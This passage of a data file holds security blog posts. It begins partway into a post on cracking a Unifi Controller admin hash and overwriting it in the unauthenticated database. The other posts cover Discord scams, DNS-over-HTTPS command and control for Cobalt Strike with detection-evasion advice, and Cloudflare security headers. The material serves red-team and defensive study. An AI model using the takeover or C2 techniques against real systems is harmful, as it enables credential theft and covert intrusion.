hash into a file named \u201chash\u201d and then start up Hashcat.  Hashcat will attempt to find a hash collision and, if it does, will output the collision in a file named \u201cpot.\u201d  We use the -m flag with Hashcat to specify the hash type and the -a flag to specify our attack mode\u2014in this case, a direct dictionary attack. \n\n# echo $6$KPCNpIC/$GzO92iNqVVQNN8cQonvDQumnwmYOnUzvC6WvGLLMcysBfporCeVt7UYgGKPnkxp8B/e0Ckp.57Q8UiWw32sM60 > hash  \n\n# hashcat -m 1800 -a 3 hash wordlist -o pot \n\nThat\u2019s a hit.  You sunk my controller-ship.  Let\u2019s grab the collision from the potentials file. \n\n# cat pot  \n\n$6$KPCNpIC/$GzO92iNqVVQNN8cQonvDQumnwmYOnUzvC6WvGLLMcysBfporCeVt7UYgGKPnkxp8B/e0Ckp.57Q8UiWw32sM60:Fall2021! \n\nThe password is Fall2021!   \n\nADMIN LOGIN TIME \n\nYou can now login to the Unifi Controller at https://localhost:8443/ with the username specified in the ace admin key \u201cname\u201d with the cracked password.  In our case, Fall2021! It\u2019s haxed. \n\nMi Hash, Su Hash \n\nLet's talk about salts and hash. \n\nTo have a little fun with this (and to prove a point about non-filtered salts), let\u2019s create our own hash.   \n\nWe will use openssl to generate a SHA512-crypt hash.  However, we will use our own custom salt\u2014a salt that Unifi should know it never used to store an actual user account credential. \n\n# openssl passwd -6 -salt BHISWASHERE Fall2021!\n\n$6$BHISWASHERE$M.ngiEju5sTwrsxbs3gRK/Ok.mp948HNn5x1PrB6UK3q/3acozGjEQtVSRZ4KUBmU02iI.TdJGhqNBj4ttbzI1 \n\nTo \u201creset\u201d that Unifi Controller admin password, we need only overwrite the x_shadow key in the ace>admin table with our new hash:  \n\n$6$BHISWASHERE$M.ngiEju5sTwrsxbs3gRK/Ok.mp948HNn5x1PrB6UK3q/3acozGjEQtVSRZ4KUBmU02iI.TdJGhqNBj4ttbzI1 \n\nThe login password will then be a very secure, Fall2021!   \n\nThe salt isn\u2019t filtered, and it will work to login to the controller. \n\nSALTY PADME \n\nSo, the salt doesn\u2019t matter.  It\u2019s not filtered.  Big deal. \n\nSorry, Padme.   \n\nImagine a runtime computed salt that is a derivative of an account attribute (like creation timestamp) plus device GUID that never gets stored, but rather, only re-computed at authentication.   \n\nAt authentication time, the user submits a password which is then added to the runtime-computed salt\u2014that is, a derivative of the user\u2019s account creation time plus the device GUID.  Since the salt would never be stored, a hacker would \u201cnever\u201d be able to correctly produce and inject an external hash into the authentication database. \n\nBut I\u2019m an idealist. \n\nWHAT ELSE? \n\nWell, aside from interesting things like the \u201cpayment\u201d table where you find payment details for the Hot Spot Unifi service, there are other tidbits that might wet your whistle too. \n\nThe \u201cdevices\u201d table has all you wanted to know about how the controller talks to the devices, including authentication. \n\nThe \u201calert\u201d table will have network metadata alerts.  You could watch as users walk around a building. \n\nIn the \u201cusers\u201d table, you will find meta-data for every network device that the controller tracks data for (basically anything any controlled Unifi device sees in its network broadcast). \n\nIn the \u201csettings\u201d table, you\u2019ll find other juicy tidbits, including the authentication and API information to Unifi\u2019s Cloud Controller service. \n\nBottom line: Every setting in the controller can be enumerated.   \n\nSMTP configurations, SYSLOG, SNMP, etc.  If it\u2019s a stored credential in the controller, you now own it.   \n\nCough\u2026 IPSEC & VPNs... cough. \n\nI CAME HERE FOR \u201cFREE\u201d WIRELESS \n\nIf logging into the dashboard wasn\u2019t your thing, you can always just pull the wireless pre-shared keys directly out of the database without logging into the controller interface. \n\nIf you look in the \u201cwlanconf\u201d table, you\u2019ll find treats like \u201cname\u201d and \u201cx_passphrase\u201d that are the plaintext SSID and pre-shared key respectively.  Remember, this is accessible even if the controller device itself cannot \u201csee\u201d the wireless network.  \n\nLet\u2019s be honest: if you\u2019ve gotten this far, spaghetti and plaintext pre-shared keys are the least of your concerns. \n\nCONCLUSION \n\nFrankly, this all started because I forgot my admin password on my local controller at home.   \n\nWhoops. \n\nRed Teamers: Check for a Unifi Controller on your target endpoints.  It may make an easy win. \n\nHOT TAKES \n\nIs the Software Unifi Controller insecure?  \nNo.  I mean, yes.  Maybe. \nIf the host that runs the Unifi Controller becomes compromised, the network is compromised.  Any external service that was configured in the controller, and potentially a linked Unifi Cloud account, should be considered compromised, and keys changed. \nBut then again, the host that runs this software should probably be better known as the \u201cUnifi Controller\u201d and protected as though it\u2019s the \u201cUnifi Controller.\u201d  Don\u2019t use a random laptop thrown in the back of a closet because you didn\u2019t want to buy the Cloud Key hardware controller.   \nBy the way, \u201ccompromise\u201d doesn\u2019t mean SYSTEM context here.  Remember, MongoDB is running without authentication.  You only need local loopback privilege (even remotely) to modify the database.    \nCould it be more secure?  \nYes, definitely.   \nBut remember how the pendulum swings both ways; another extreme: \nAll the sensitive bits could be protected with PKI infrastructure controlled by Ubiquiti.  That would be better, right?   \n#GetOffMYLawnAlexa \nIsn\u2019t SHA512cyrpt broken anyway?   \nEhh, sure, here\u2019s some math: https://pthree.org/2018/05/23/do-not-use-sha256crypt-sha512crypt-theyre-dangerous/ \nDid I contact Ubiquity?   \nNo.  This is by their design.  I\u2019m not even mad. \nAs a systems administrator, I acknowledge this behavior would be consistent with other manufacturer network controllers not installed on Windows.  For example: a console cable can give you root privileges on a switch with nothing more than physical access\u2014but you have that switch locked in a secure facility.  \nThis only appears bad because of the perception that it\u2019s OK to install the software on any Windows host, including a personal-use laptop.  The network controller here leverages the security of the host itself.   \nWhen you install this software, the device becomes a network controller, and you need to secure it like one. \nDon\u2019t install network controller software on vulnerable devices.   \nThe only thing I\u2019d say more is that the ease of install may have trivialized the security considerations of operating the controller\u2014or at least the considerations used in the decision to install on a specific device. \nThese products really do \u201cjust work\u201d and consequently, it becomes easy to forget the security implications of how they \u201cjust work.\u201d \nCan you automate Unifi stuff?  \nYes, but this guy did it first:  https://github.com/MichaelMcCool/Unifi \n\nBETTER SECURITY FOR SOFTWARE UNIFI CONTROLLER: \n\nDid you know that after your Unifi devices are configured, they never need to talk to the controller?  Just turn off the service after your devices are configured.  The configuration on the devices will survive reboots and your mesh \u201cshouldn\u2019t\u201d be impacted. \n\nIf a few years later you turn on the controller and find you\u2019ve forgotten the password, you\u2019ll find this blog post and can just change it hacker-style. \n\nTHE MORAL OF THE STORY \n\nReal friends don\u2019t let kids play Roblox on network controllers. \n\nRESOURCES:  \n\nUnifi Cloud Compromised: https://krebsonsecurity.com/2021/03/whistleblower-ubiquiti-breach-catastrophic/ \n\nUniFi Controller: https://www.ui.com/download/unifi/ \n\nUniFi Ports: https://help.ui.com/hc/en-us/articles/218506997-UniFi-Ports-Used \n\nModular Crypt Format: https://passlib.readthedocs.io/en/stable/modular_crypt_format.html#modular-crypt-format \n\nAPI Wrapper for Unifi GUI: https://github.com/MichaelMcCool/Unifi \n\nNOSQLBooster: https://nosqlbooster.com/ \n\nDBeaver: https://dbeaver.io/ \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Not Get Scammed on Discord\"\nTaxonomies: \"Author, How-To, Informational, Max Boehner, Noah Heckman, Phishing\"\nCreation Date: \"Mon, 08 Nov 2021 22:02:46 +0000\"\nMax Boehner & Noah Heckman //\n\nIntroduction \n\nAs 2020 sent us all into our homes social distancing, the demand for online messaging saw a huge spike in an effort for people to stay in contact with each other. In some cases, even entire social events (like conferences and club meetings) were ported to platforms such as Discord and Slack to increase biological security, while still allowing individuals to meet and communicate with each other. But like all things, when the user base moves, so do the actors who will try to take advantage of them. Since Black Hills Information Security (BHIS) has a vested interest in Discord, we wanted to write this blog to provide an overview of currently common attacks against Discord users that we are seeing, and how to protect yourself from them. \n\nUser Account Takeover \n\nDuring our research, we found that one of the most common goals of social engineering on Discord is the takeover of legitimate Discord user accounts. To understand the motives behind those attacks, it is important to understand the value of these accounts and what attackers are using them for. After all, why would the attackers not simply create new accounts instead of going through the trouble of compromising those of others? \n\nWhile researching this topic, we learned about the value of existing accounts first-hand. To learn more about Discord phishing, we actively tried to become targets of such attacks. We created Discord burner accounts and joined servers on various topics that might attract scammers. However, we noticed that many Discord servers have hurdles in place that make it more difficult for users to join. While some servers only allow user accounts with verified phone numbers, others require solving small challenges to prove the user is not a bot, such as reacting to a specific message.  \n\nIn one case, we were even vetted in a discussion with an administrator who also inquired about the short lifetime of our account. \n\nCompromising existing user accounts can aid attackers in circumventing these server protections since existing accounts will often be members of servers already. Access to such servers gives them the opportunity to post phishing messages within the chat rooms or to send direct messages to other server members. What makes this even more effective for social engineering is the fact that Discord servers are often dedicated to a specific topic\u2014such as gaming, cryptocurrencies, or information security. This allows attackers to craft their message pretexts with a specific audience in mind, increasing the chance of success. For example, members of a Discord server related to cryptocurrency may be more susceptible to phishing messages related to that topic than others. Similarly, members of a gaming Discord server are excellent targets for attacks aimed at taking over accounts for gaming platforms, such as Steam. \n\nAdditionally, existing users will often have contacts within Discord that may be more likely to trust them, thus increasing the chance of success for further social engineering attacks. These further attacks can either be aimed at compromising more Discord accounts or at achieving additional goals, such as financial gain. We will discuss typical end goals of these account takeover campaigns later on in this blog. \n\nNow that we have established the value of legitimate Discord accounts, we will provide some examples of common ways attacks are conducted. Here we found that phishing for Discord accounts typically uses pretexts related to Discord. \n\nA social engineering technique that has been discussed in the past (for example, in this Portswigger blog post: https://portswigger.net/daily-swig/discord-users-warned-over-qr-code-login-scam-that-can-result-in-pwned-accounts involves the Discord's QR code login function. For this to work, the victim needs to be logged in to the Discord mobile app on their phone. An attacker will then send the victim a QR code obtained from the Discord login page and attempt to trick the victim into scanning it with their app. \n\nIf the victim scans the QR code, they will be prompted to confirm that they want to log in. If the \"Yes, log me in\" button is pressed, the attacker is logged into the victim's account. \n\nDiscord has acknowledged these QR code attacks and shortened the validity period of QR codes to two minutes to reduce the likelihood of success (https://support.discord.com/hc/en-us/articles/360039213771-QR-Code-Login-FAQ). However, within these restrictions, the attack is still possible in the way described above. \n\nOur research indicates that some of the most common account takeover attacks are related to free Discord Nitro subscriptions. Discord Nitro is a paid subscription which offers additional features to Discord users. These include more detailed profile pages, additional emojis and stickers, bigger file uploads, and so on. These features are desirable enough to many users that the offer of free Nitro has become a quite successful social engineering pretext. One factor that may aid attackers here is that legitimate Nitro giveaways have happened in the past. On top of that, a legitimate way to gift Discord Nitro to other users exists, which generates a link pointing to the discord.gift domain (source: https://support.discord.com/hc/de/articles/1500001829622-Claiming-a-Nitro-Gift-FAQ). Users who know about these legitimate giveaways may be more inclined to react to social engineering attacks that mimic these giveaways. \n\nThese phishing attacks can take various forms. They may, for example, entice the user into opening a link to an attacker's website that prompts the user to log in with their Discord credentials, potentially providing the attacker with access to the user's account. One way to trick users into thinking a link is legitimate is through typosquatting a domain that appears to be related to Nitro gifts. Those can either be targeted at Discord account takeover or at the takeover of third-party platform accounts. We will provide an example of the latter in the next section. \n\nSteam Account Takeover \n\nA popular variant of this attack method uses the promise of free Nitro access to compromise Steam accounts. Steam is a popular gaming platform used by millions of players. It also includes marketplace and trading features that can be used to buy, sell, and trade virtual items from games, as well as a wallet feature that lets users store funds. Attackers who compromise Steam accounts may be able to gain a direct financial benefit from doing so. Steam forums and communities like Reddit contain numerous reports of users who have suffered from account takeovers after falling for similar Discord Nitro phishing attacks. \n\nThe outline below provides an example of such a phishing attack. The attack starts with a message sent to users containing a typosquatting link. \n\nThe page that is opened attempts to mimic the look of the official discord.com website. Many of the links contained even point back to the valid Discord domain in an attempt to make the site look as legitimate as possible.  \n\nClicking the \"Get Nitro\" button opens a login page that is visually similar to the Steam login page. However, this page is also hosted on the steamdlscord[.]com domain, suggesting that this is aimed at capturing Steam credentials.\n\nIf the account takeover is successful, the attackers may attempt to trade off any valuable items in the account inventory or use the account's wallet balance to buy game gift codes. While account recovery from this is typically possible, those efforts may not be able to restore any lost valuables. \n\nAnother dishonorable mention in the Steam account takeover category involves scammers messaging victims on Discord that they have \"accidentally\" reported them for abuse on Steam and now the victim must take action to prevent their account from being banned. An important part of the pretext here is that the victim has linked their Discord and Steam accounts, providing a very useful piece of information to the attacker, allowing them to create a more believable pretext. This blog describes this technique in detail: https://blog.malwarebytes.com/scams/2021/03/steam-users-dont-fall-for-the-i-accidentally-reported-you-scam/. \n\nCryptocurrency Scams \n\nCryptocurrencies are another commonly used topic within social engineering attempts on Discord. While they are expectedly quite common on servers related to this topic, they are also prevalent on unrelated servers. While the pretexts and delivery methods can vary, the end goal is always the same: gaining a financial benefit at the expense of unsuspecting victims. \n\nThe following message shows an example that attempts to get the victim to visit a seemingly legitimate cryptocurrency change website under the guise of a Bitcoin giveaway. \n\nThe messenger offers a promo code that promises 0.42 BTC (Bitcoin) as a giveaway. At the time of this writing, that is equivalent to approximately 20k USD. That sounds too good to be true, right? \n\nThe scammers have made great efforts to make the target site appear like a legitimate crypto exchange.  \n\nWhen scanning the site via urlscan.io, an interesting observation can be made though. There appear to be a large number of similar other sites available. \n\nVisually, the only difference between these sites is their domain name, as well as the name displayed on the site. \n\nFrom this point forward, the victim would need to register to this trading site to enter the \"promo\" code. We did not investigate further into this specific site but, based on other research, we suspect that the next steps would have asked us to pay a fee to unlock the 0.42 BTC, without the promised Bitcoin ever being paid afterwards. For further explanation of this scam, please have a look at this video: https://youtu.be/R7WL_xFF0R8. \n\nAnother common social engineering technique that we observed includes sending Discord server invite links via direct messages or other server chat rooms. While inviting users to new servers is not directly malicious, it can function as a precursor to later social engineering attacks.  \n\nWe received the following message inviting us to a cryptocurrency arbitrage trading server, promising free money via arbitrage between different trading platforms. \n\nThis particular attack appears to revolve around victims being coerced into buying cryptocurrency from a legitimate trading site and then sending it to a fraudulent one. \n\nMalware Distribution via Discord \n\nOftentimes used along with the methods above, there has been a multitude of reports regarding malware distribution via Discord. There are several contributors as to why this works specifically well with Discord vs other platforms. One of the main reasons is due to Discord having a universally available worldwide content delivery network (CDN). Intended to allow users to share files and pictures back and forth, this service allows attackers to host malware on trusted servers owned by Discord. When files are uploaded to Discord, it will upload them to the service which is hosted at cdn.discordapp.com. While CDN abuse is not new, when paired with spear phishing, this may convince some users that this file is coming from a \u201ctrusted\u201d source.\n\nThis also means that for any users/employers who are running access control lists (ACL\u2019s) blocking commonly abused sites such as GitHub or Pastebin, the attackers may be able to bypass said protections if you allow traffic to Discord\u2019s CDN service.  \n\nMalware Targeting the Discord Client \n\nOf course, that example requires the user to download and execute the file stored on the CDN. There are historically easier methods however... In 2020, Masato Kinugawa published a blog post regarding a full exploit chain on the Discord client to achieve remote code execution by simply having the end user click on an iframe, causing a 3d project file hosted on sketchfab to render and execute NodeJS code. Discord is built on Electron, which can allow the web application to access local system resources, bypassing some of the sandboxing features which have become a staple in the security of the modern web browser. While the client may be a convenient way to access the chat application, it may not be your safest option. Another notable element in the exploit chain was the exploit of Discord\u2019s iframe embedding in its web application. While this feature can be disabled in the user settings, it is enabled by default.  \n\nAnother notable Discord malware known as BlueFace was found by MalwareHunterTeam and reported by bleepingcomputer.com back in 2019, when malware was discovered to be modifying the JavaScript for the application to weaponize the client and exfiltrate information to the attacker. These examples show that the Discord client is actively being tested for exploits that are specifically related to its use of Electron. Depending on your threat model, you may want to consider disabling this, though it will come at the expense of breaking all those fantastic gifs in your chat. Even better still, consider accessing Discord via a web browser instead of the Electron app, if possible. \n\nProtections and Countermeasures \n\nThe best protection against social engineering attacks is knowing that they can occur and staying suspicious of messages, links, or server invites. This will also be the last line of defense, if all other preventative measures fail and a malicious message gets through to the user. To lower the likelihood of such messages appearing there, the following settings can be configured by users: \n\nSafe Direct Messaging: This will scan all images and videos sent to the user via direct messages and block potentially undesired content. While not directly aimed at preventing phishing, this may help filter out malicious messages, in some cases. We recommend choosing either the top or middle option. \n\nServer Privacy Defaults: This option sets the default value for allowing direct messages from users that have at least one common server with the user. Disabling this option will reduce the risk of receiving phishing messages. This option can also be set on a per-server basis by right-clicking on a specific server. We recommend setting the default value to \"disabled\" and enabling direct messages only for servers that you trust. \n\nWho Can Add You as a Friend: This option defines who can add you as a friend in Discord. Any user that you add as a friend will be able to send you direct messages, regardless of setting #2. Disabling the \"Everyone\" option can help prevent social engineering attacks but may also prevent legitimate friend requests. For added security, disabling the \"Server Members\" setting is also an option. \n\nTo reduce the likelihood of successful account hijacking attacks, we recommend enabling Two-Factor Authentication. While this does not protect against the QR code attack described above, it can reduce the impact of other credential-stealing attacks. \n\nUsing Discord from within a web browser, as opposed to the Desktop application for added security, was already mentioned earlier. However, if you choose to use the Desktop application, we recommend checking that the feature \"Automatically detect accounts from other platforms on this computer\" is disabled.  \n\nAdditionally, we advise you not to connect accounts from other services, such as Steam or Twitch, to your Discord account. Having other accounts connected may give attackers additional information that can be used for social engineering attacks. This practice is also good for privacy. \n\nOn top of measures that can be taken by individual users, there are also ways for server admins to improve security. Please refer to this official Discord documentation page for more information: https://discord.com/safety/360043653152-Four-steps-to-a-super-safe-server \n\nSummary \n\nWe wrote this blog with the intention of providing an overview of currently common attacks against Discord users. We showed that attackers are often using Discord to target specific user groups, such as Steam users or cryptocurrency enthusiasts, and may be using the Discord platform itself to host malicious files for their attacks. Knowing about the prevalence and different variants of social engineering attacks can help strengthen users' security posture. To follow up, we have provided a list of mitigations, and instructions on how users can implement them to reduce the likelihood of falling victim to such attacks. However, like most phishing and social engineering attacks vectors, it often comes down to the vigilance of each individual user to avoid falling victim. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"DNS Over HTTPS for Cobalt Strike\"\nTaxonomies: \"Author, Informational, InfoSec 101, Kyle Avery, Red Team\"\nCreation Date: \"Wed, 17 Nov 2021 19:45:50 +0000\"\nKyle Avery //\n\nIntroduction\n\nSetting up the C2 infrastructure for red team engagements has become more and more of a hassle in recent years. This is a win for the security community because it means that vendors and professionals have learned from previously successful techniques and implemented effective mitigations in their networks.\n\nDNS over HTTPS is an underappreciated channel for command and control. This blog will show you how to utilize DoH with Cobalt Strike in a way that requires no third-party accounts or infrastructure setup, encrypts traffic with a valid SSL certificate, and sends traffic to reputable domain names.\n\nExisting Techniques\n\nAttackers and offensive security professionals have been using different redirector implementations for some time. The first redirectors that I used were simple Apache and Nginx servers configured with various rules to forward traffic based on predefined criteria.\n\nRedirectors are great for making infrastructure more resilient, but they can also bypass defenses that rely on domain categorization. For example, once Content Delivery Networks (CDN) became more accessible to developers, attackers moved from traditional redirectors to these platforms because they often provide a valid domain name and even SSL certificate to the user, reducing the work of an attacker.\n\nA technique known as \"domain fronting\" was later discovered and used heavily by many testers. More recently, however, CDN providers have been cracking down on this behavior. Many sites prevent domain fronting entirely or actively search for those using it. Microsoft in particular has been known to shut down Azure Subscriptions in the middle of our operations.\n\nI have recently turned to other cloud services such as Azure App Services and Cloudflare Workers for traffic redirection. These have the same benefits as traditional CDNs but are less heavily monitored. While these services work well, cloud providers could decide to start watching these with the same dedication as they watch CDNs any day.\n\nDNS over HTTPS\n\nTraditional DNS Beacons are relatively straightforward to detect. I have never used the Cobalt Strike DNS listener on an operation, limiting me to the previously described HTTPS listener and redirectors.\n\nDNS over HTTPS for Beacon provides us reputable domains and valid SSL certificates without needing an account or any configuration of the redirector. This reduces an operator's setup time even further and eliminates the risk of account shutdown.\n\nToday's Topic: DNS over HTTPS for Cobalt Strike\n\nThe use of DNS over HTTPS was first presented to me on Twitter by Austin Hudson. His tweets over the last year detailed his progress towards this capability and resulted in an open-source tool: TitanLdr. This Cobalt Strike user defined reflective loader (UDRL) hooks the Cobalt Strike Beacon's import address table (IAT) to replace the API call responsible for making traditional DNS queries (DNSQuery_A) with a function that makes DoH requests to dns.google (8.8.8.8 and 8.8.4.4).\n\nThis alone is an excellent capability, but TitanLdr's DNSQuery_A hook is generic enough to work with many different DoH servers! I have tested the following domains and confirmed that they work as drop-in replacements:\n\ndns.quad9.net\n\nmozilla.cloudflare-dns.com\n\ncloudflare-dns.com\n\ndoh.opendns.com\n\nordns.he.net\n\nUsing TitanLdr\n\nTitanLdr is the key to integrating this capability into Cobalt Strike. You can grab the original TitanLdr, which beacons to a single DNS provider over HTTPS server here: https://github.com/secidiot/TitanLdr. You can change the DNS server on line 111 of the DnsQuery_A.c file in the hooks directory.\n\n Line 111 in TitanLdr/hooks/DnsQuery_A.c (Original Repository) \n\nI have since forked TitanLdr to allow for multiple DoH servers to be specified. Each time a callback is made, the Beacon will randomly select one from a hardcoded list. If you want to use multiple DoH servers, you can download my fork here: https://github.com/kyleavery/TitanLdr. You can modify the list of servers at line 116 of the DnsQuery_A.c file in the hooks directory.\n\n Line 116 in TitanLdr/hooks/DnsQuery_A.c (Forked Repository) \n\nOnce downloaded, you will have to build the program. This will require a Linux host with NASM and MinGW installed. Once you have these programs, run the make command to create the necessary files.\n\n Building TitanLdr \n\nImport the Titan.cna Aggressor script into Cobalt Strike, and you are ready to use DoH! Configure a DNS listener as you usually would. The Cobalt Strike documentation goes more in-depth on configuring this listener.\n\nConfiguring a DNS Listener\n\nOnce the Beacon is running, we can see that only one DNS request is made to resolve the DoH server address. Afterward, all of the traffic is encrypted HTTPS.\n\n DoH Beacon Network Traffic \n\nDrawbacks of DNS over HTTPS\n\nWe've already discussed the benefits a DNS over HTTPS Beacon has over a traditional HTTPS Beacon, but there are also some definite drawbacks.\n\nFirst, more packets are needed to communicate the same information back to the team server. A DNS TXT record can only contain a maximum of 255 characters, meaning we can only send a small amount of data in each packet.\n\nSecond, we have no control over the path or domain names of available servers. It seems easier for an environment or appliance to deny outbound 443/TCP to the list of popular or known DoH servers than block Microsoft\u2019s *.azurewebsites.net or Cloudflare\u2019s *.workers.dev. You could solve this by using more obscure DoH servers or by building your own and categorizing them over time, depending on how the environment is configured.\n\nPotential Detection Methods\n\nCurrent detection techniques may have gaps when it comes to detecting DNS over HTTPS.\n\nCurrent detections targeting malicious HTTPS traffic typically utilize domain reputation, rendering them potentially ineffective against DoH since the domains in use are reputable.\n\nCurrent detections targeting malicious DNS traffic typically monitor for many DNS requests, rendering them potentially ineffective against DoH since the traffic is no longer using the DNS protocol.\n\nA combination of traditional DNS monitoring and SSL inspection could be a potential solution, but I do not know of any current tools or products that do this.\n\nMy understanding is that the primary defense against this attack is blocking outbound 443/TCP to known DoH servers that an organization is not using. Most networks I encounter still use traditional DNS, often with a local DNS server running as part of the Active Directory environment. In this case, there is no need to allow HTTPS traffic to dns.google, cloudflare-dns.com, or any others mentioned in this post.\n\nClosing Thoughts\n\nThere are absolutely more DNS over HTTPS servers that could be used with this configuration. In addition, the user could set up their own DoH server, maybe even behind a CDN or other cloud service, to introduce a variation on this technique.\n\nTitanLdr is limited to Cobalt Strike, but the DoH implementation could be ported to any other C2 framework.\n\nThis method will not be the best in every scenario, but it is another tool in the toolkit that I hope you can take advantage of. Feel free to contact me with any questions or comments on Twitter @kyleavery_.\n\nCredits\n\nThe idea to use DNS over HTTPS for C2 comes from the work of Austin Hudson. This technique and blog would not have happened without his TitanLdr project. Austin's code and tweets have inspired many of my personal projects; I highly recommend following him.\n\nI mentioned that I currently use two redirector services for traditional HTTPS Beacons: Azure App Services and Cloudflare Workers. I originally discovered these techniques at the following two links:\n\nhttps://ajpc500.github.io/c2/Using-CloudFlare-Workers-as-Redirectors/\n\nhttps://github.com/bashexplode/cs2webconfig\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Fixing Content-Security-Policies with Cloudflare Workers\"\nTaxonomies: \"Author, How-To, Informational, Kent Ickler, Content-Security-Policy, Kent Ickler, Permissions-Policy, Referrer-Policy, Security Headers, Strict-Transport-Security, X-Content-Type-Options, X-Frame-Options\"\nCreation Date: \"Fri, 03 Dec 2021 18:31:18 +0000\"\nKent Ickler //\n\nBackground\n\nOver four years ago now, I wrote a blog post on fixing missing Content-Security-Policy by updating configuration on webservers: https://www.blackhillsinfosec.com/fix-missing-content-security-policy-website/. Content-Security-Policies instruct a user\u2019s web browser how it should behave on certain security considerations.\n\nOh, how times have changed. Here at Black Hills Information Security (BHIS), we\u2019ve actually migrated webservers, hosting companies, security platforms \u2014 that list goes on and on. The \u201cbest practices\u201d for Content-Security-Policies have changed in the last four years too. On our new hosting platform, we need to set up appropriate content security headers again. Since we now use Cloudflare for our CDN and WAF provider, we have some new opportunities for fronting our Content-Security-Policies outside of the web server itself.\n\nInitial Testing\n\nBefore you go about updating your Content-Security-Policies, it\u2019s good to have a clear picture of how your server currently handles/sends Content-Security-Policies. A good way to test this configuration is to use a third-party tool. We can use SecurityHeaders.io to scan our website\u2019s Content-Security-Policy configuration.\n\nLink: https://www.securityheaders.io\n\nIn the case below, we\u2019ve had SecurityHeaders.io scan the WildWestHackinFest.com website.\n\nThat looks bad, right? Well, maybe. It is important to note that Content-Security-Policies are used to instruct the browser how to handle security concerns within the browser. This is critical on websites where there is user interaction and sensitive information being disclosed. For example, it would be imperative that a banking website, health records portal, or other user-interaction service have appropriate Content-Security-Policy headers. In the scenario where there is no user interaction or no sensitive information disclosed, it becomes less imperative that Content-Security-Policies be configured in a very secured state.\n\nHere\u2019s a good example of a \u201cnot-great\u201d configuration scenario: The US Social Security Administration has a portal where users can login and access sensitive information about their account. The portal login landing page is https://secure.ssa.gov:\n\nAlright, so that\u2019s a picture of what not to do.\n\nIf you\u2019re looking to correct some of these issues, you have a couple methods afforded to you. The first is to read the blog from four years ago that demonstrates how to fix the issue by configuring your web server with the appropriate Content-Security-Headers. But there is another way.\n\nCloudflare Workers\n\nLink: https://workers.cloudflare.com/\n\nCloudflare Workers are a serverless section of server-side-JavaScript that can perform actions or modify web traffic associated with a Cloudflare CDN/WAF protected site. In the case of our earlier example, https://wildwesthackinfest.com is a website that is served by the Cloudflare network. This allows us to use the Cloudflare Workers service to manipulate web traffic without having to update the backend (\u201corigin\u201d) web servers associated with the website. BHIS operates multiple websites and using Cloudflare Workers will also allow us to centralize the response-header manipulation to one programmatic location, rather than managing multiple backend server configuration.\n\nPrerequisites\n\nTo allow a Cloudflare Worker to manipulate your web server\u2019s traffic, you must ensure that the webservice has \u201cOrange Cloud\u201d configuration on Cloudflare.\n\nYou must also enable the Workers service. After logging into Cloudflare and selecting your domain, click on the \u201cWorkers\u201d tab to get the service initiated.\n\nBuilding the Worker\n\nOnce you have Cloudflare Workers enabled \u2014 on the Workers tab, click on \u201cManage Workers\u201d and then \u201cCreate Service.\u201d Give your new worker a name and select \u201cHTTP Handler\u201d as the starter template. Then, find the \u201cQuick Edit\u201d button to access the Cloudflare Worker editor/IDE.\n\nNext, replace the existing template code with the following worker code.\n\nLink: https://github.com/Relkci/cf-worker-header-injector/blob/main/worker.js\n\naddEventListener('fetch', event => {\n event.respondWith(handleRequest(event.request))\n})\n\nasync function handleRequest(request) {\n\n let originalResponse = await fetch(request)\n\n // pass in the original response so we can modify some of it.\n let response = new Response(originalResponse.body,originalResponse);\n\n response.headers.set('X-Frame-Options', 'SAMEORIGIN');\n response.headers.set('Referrer-Policy','same-origin');\n response.headers.set('Content-Security-Policy', 'default-src \\'self\\' \\'unsafe-inline\\'');\n response.headers.set('Feature-Policy','camera \\'none\\'; geolocation \\'none\\'');\n response.headers.set('X-Content-Type-Options','nosniff');\n response.headers.set('X-XSS-Protection','1; mode=block');\n response.headers.set('Permissions-Policy', 'camera=(), geolocation=(), microphone=()');\n return response\n}\n\nThe above is a starter template for Content-Security-Policies. You should configure each policy as you see fit for your website. Any headers you add here will later be added to your web server\u2019s HTTP Responses. Press \u201cSave and Deploy.\u201d Don\u2019t worry, nothing is live yet.\n\nIn the next step, we will associate the new Cloudflare Worker with your website. After we do this, your worker will begin intercepting HTTP responses from your backend (origin) web server and injecting the headers specified in the worker code.\n\nApply the Worker\n\nAfter you have your worker saved, return to the Cloudflare Workers tab associated to your domain and press \u201cAdd Route.\u201d The Add Route functionality associates your new worker with your web server. As soon as this is done, your backend (origin) web server\u2019s HTTP responses will be intercepted by the worker and the worker will inject the headers according to its code.\n\nAfter the worker has been routed with your website, you\u2019ll find the Workers tab now lists the active routes.\n\nContent-Security-Policy Refinement\n\nAs soon as you associate the worker, remember that restrictive Content-Security-Policy settings may break rendering or functions of your website if you use JavaScript, CSS, or external resources. The Content-Security-Policy instructs the browser which resources are safe to load. A restrictive policy may prevent the loading of necessary resources. As you update your Content-Security-Policy for your website, you may see errors or rendering issues that are related to the new Content-Security-Policies. The easiest way to identify the Content-Security-Policy violations is to use the browser\u2019s developer mode (typically, press F12). The Network or Console tabs will typically alert you to violations that will need to be accounted for in the Content-Security-Policy.\n\nHere's an example of a console error:\n\nThis error lets us know that within the script-src setting in the CSP, the stats.wp.com is not explicitly trusted. There are various ways we can go about adding trust for this source; one method is to add https://stats.wp.com to the script-src setting. After updating and re-deploying the worker, refresh and you should see that the resource was allowed to load and consequently did not present an error in the developer console.\n\nWorker Pricing\n\nOne last note regarding the addition of the Workers service and the creation of the Worker later \u2014 Cloudflare does provide a free tier to workers, and two different price schemes: Bundled and Unbound.\n\nIf you\u2019re worried about what that might cost you, we were too. We used the Unbound pricing scheme because it was the default. We\u2019re probably safe to update the model to Bundled since our Workers\u2019 execution time is less than 50ms. The Workers dashboard will show the execution time so you can make your own decision.\n\nAnyhow, with the Unbound pricing model, we weren\u2019t at much risk regardless. Here\u2019s a picture of one month of Bundled worker activity on one of our busier websites:\n\nAt the end of the day, $5.38 wasn\u2019t a bad cost to us for +1M website hits.\n\nIt\u2019s worth noting that you can (and perhaps should) limit your worker route to typically only affect website resources that will instruct a web browser to create additional sub-queries for resources. These are typically HTML, PHP, ASP, etc. Images and videos usually do not need a CSP as they typically do not instruct the browser to create additional HTTP requests. For example, you may omit a web server directory that contains only images. The worker routes can be stacked. Setting a route to a service of \u201cNone\u201d will prevent execution of workers.\n\nOWASP Secure Headers Project\n\nLink: https://owasp.org/www-project-secure-headers/\n\nFor a good resource on the types of Security Headers and their appropriate use, check out the OWASP documentation on Response Headers.\n\nContent-Security-Policy Reference\n\nLink: 